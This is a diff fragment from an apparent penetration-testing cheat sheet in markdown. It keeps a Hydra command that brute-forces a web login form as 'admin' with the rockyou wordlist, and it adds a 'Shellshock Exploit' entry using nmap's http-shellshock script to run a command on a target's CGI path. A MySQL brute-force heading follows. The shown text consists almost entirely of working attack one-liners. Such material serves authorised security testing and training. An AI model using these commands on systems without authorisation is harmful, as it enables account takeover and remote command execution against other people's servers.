@@ -11,6 +11,11 @@
 hydra -s <port> -I -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form '/index.php:tg=login&referer=index.php&user=^USER^&password=^PASS^&submit_login=Submit:F=bad+passowrd' -vV
 ```
 
+**Shellshock Exploit:**
+```
+nmap --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls -p80 <ip>
+```
+
 ## MySQL
 
 **brute-force via nmap:**
